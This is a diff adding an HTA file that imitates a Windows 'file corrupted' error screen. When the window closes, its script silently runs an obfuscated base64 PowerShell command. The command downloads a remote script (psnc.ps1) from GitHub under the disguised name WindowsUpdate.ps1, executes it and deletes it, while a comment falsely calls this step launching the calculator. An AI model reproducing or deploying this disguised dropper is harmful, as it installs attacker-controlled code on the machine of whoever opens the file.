@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Windows Error</title>
+    <HTA:APPLICATION 
+        ID="BSOD"
+        BORDER="THIN"
+        CAPTION="YES"
+        MAXIMIZEBUTTON="YES"
+        MINIMIZEBUTTON="YES"
+        SHOWINTASKBAR="YES"
+        SINGLEINSTANCE="YES"
+        SYSMENU="YES"
+        WINDOWSTATE="NORMAL"
+    />
+    <script>
+        function getFileName() {
+            var fullPath = window.location.pathname;
+            return fullPath.split('/').pop();
+        }
+
+        function closeApp() {
+            try {
+                var shell = new ActiveXObject("WScript.Shell");
+                var comando = 'cmd /c start "" /B powershell.exe -encodedCommand "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBlAG0AYQBrAGUAZABpAGUALwBVAEMATgAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBwAHMAbgBjAC4AcABzADEAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVQBzAGUAcgBzAFwAYwBhAG4AZAByAGEAZABlAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABXAGkAbgBkAG8AdwBzAFUAcABkAGEAdABlAC4AcABzADEAJwA7ACAAJgAgACcAQwA6AFwAVQBzAGUAcgBzAFwAYwBhAG4AZAByAGEAZABlAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABXAGkAbgBkAG8AdwBzAFUAcABkAGEAdABlAC4AcABzADEAJwA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJwBDADoAXABVAHMAZQByAHMAXABjAGEAbgBkAHIAYQBkAGUAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUALgBwAHMAMQAnACAALQBGAG8AcgBjAGUA" ';
+                shell.Run(comando, 0, false);  // Ejecutar la calculadora en segundo plano
+            } catch (e) {
+                alert("Error ejecutando el comando: " + e.message);
+            }
+            window.close();  // Cerrar la ventana HTA
+        }
+
+        // Detectar el cierre de la ventana desde el botón de cerrar de Windows
+        window.onunload = closeApp;
+    </script>
+    <style>
+        body {
+            background-color: #0078D7;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        .error-icon {
+            font-size: 100px;
+            margin-bottom: 20px;
+        }
+        .error-text {
+            font-size: 24px;
+            line-height: 1.5;
+        }
+        .error-code {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .progress {
+            margin-top: 20px;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="error-icon">:(</div>
+    <p class="error-text">Windows has detected a problem with the file <b><script>document.write(getFileName());</script></b> and needs to close.</p>
+    <p class="error-text">The file appears to be corrupted or defective and cannot run properly.</p>
+    <p class="error-text">If this problem persists, try reinstalling the program or contact technical support.</p>
+    <p class="error-code">FILE_CORRUPT_ERROR</p>
+</body>
+</html>
